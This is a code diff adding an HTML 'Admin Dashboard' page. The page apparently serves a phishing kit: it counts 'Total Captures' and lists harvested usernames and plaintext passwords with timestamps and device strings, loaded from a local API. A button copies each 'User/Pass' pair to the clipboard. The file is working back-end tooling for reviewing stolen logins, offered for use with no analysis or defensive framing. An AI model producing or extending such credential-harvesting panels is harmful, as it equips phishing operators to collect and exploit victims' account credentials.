@@ -1,0 +1,117 @@
+<!-- admin.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Admin Dashboard</title>
+ <link rel="stylesheet" href="styles.css">
+ <style>
+.admin-header {
+ background: var(--card-bg);
+ padding: 1rem 1.5rem;
+ box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+ margin-bottom: 2rem;
+ display: flex;
+ justify-content: space-between;
+ align-items: center;
+ }
+.admin-title { font-weight: 700; font-size: 1.25rem; color: var(--text); }
+.stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 2rem; }
+.stat-card { background: var(--card-bg); padding: 1rem; border-radius: var(--radius); text-align: center; box-shadow: var(--shadow); }
+.stat-val { font-size: 2rem; font-weight: 700; color: var(--primary); }
+.stat-label { font-size: 0.85rem; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.5px; }
+.table-container { overflow-x: auto; background: var(--card-bg); border-radius: var(--radius); box-shadow: var(--shadow); }
+ table { width: 100%; border-collapse: collapse; min-width: 600px; }
+ th, td { padding: 1rem; text-align: left; border-bottom: 1px solid #e5e7eb; }
+ th { background: #f9fafb; font-weight: 600; font-size: 0.85rem; color: var(--text-light); }
+ tr:last-child td { border-bottom: none; }
+ tr:hover { background: #f9fafb; }
+.date { font-size: 0.8rem; color: var(--text-light); }
+.badge { display: inline-block; padding: 0.25rem 0.5rem; font-size: 0.75rem; border-radius: 999px; background: #e0e7ff; color: var(--primary); font-weight: 600; }
+.actions { display: flex; gap: 0.5rem; }
+.btn-sm { padding: 0.4rem 0.8rem; font-size: 0.8rem; border-radius: 6px; border: none; cursor: pointer; font-weight: 500; }
+.btn-copy { background: var(--bg); color: var(--text); }
+.btn-copy:hover { background: #e5e7eb; }
+ </style>
+</head>
+<body>
+ <div class="admin-header">
+ <span class="admin-title">Admin Dashboard</span>
+ <button onclick="loadData()" class="btn-primary btn-sm" style="width: auto;">Refresh</button>
+ </div>
+
+ <div class="container">
+ <div class="stats-row">
+ <div class="stat-card">
+ <div class="stat-val" id="totalCount">0</div>
+ <div class="stat-label">Total Captures</div>
+ </div>
+ </div>
+
+ <div class="table-container">
+ <table id="dataTable">
+ <thead>
+ <tr>
+ <th>ID</th>
+ <th>Username</th>
+ <th>Password</th>
+ <th>Time</th>
+ <th>Device</th>
+ <th>Action</th>
+ </tr>
+ </thead>
+ <tbody>
+ <!-- Data will be injected here -->
+ </tbody>
+ </table>
+ </div>
+ </div>
+
+ <script>
+ async function loadData() {
+ const tbody = document.querySelector('#dataTable tbody');
+ tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">Loading...</td></tr>';
+ 
+ try {
+ const response = await fetch('/api/data');
+ const data = await response.json();
+ 
+ document.getElementById('totalCount').textContent = data.length;
+ 
+ if (!data || data.length === 0) {
+ tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding: 2rem; color: var(--text-light)">No data found</td></tr>';
+ return;
+ }
+
+ tbody.innerHTML = data.map(row => `
+ <tr>
+ <td><span class="date">#${row.id.slice(-4)}</span></td>
+ <td><strong>${row.username}</strong></td>
+ <td><code>${row.password}</code></td>
+ <td><span class="date">${new Date(row.timestamp).toLocaleString()}</span></td>
+ <td><span class="badge">${row.userAgent.substring(0, 15)}...</span></td>
+ <td>
+ <div class="actions">
+ <button class="btn-sm btn-copy" onclick="copyToClipboard('${row.username}', '${row.password}')">Copy</button>
+ </div>
+ </td>
+ </tr>
+ `).join('');
+ } catch (error) {
+ console.error('Error loading data:', error);
+ tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color: var(--error)">Failed to load data</td></tr>';
+ }
+ }
+
+ function copyToClipboard(username, password) {
+ navigator.clipboard.writeText(`User: ${username}\nPass: ${password}`).then(() => {
+ alert('Credentials copied to clipboard!');
+ });
+ }
+
+ // Load data on page load
+ loadData();
+ </script>
+</body>
+</html>
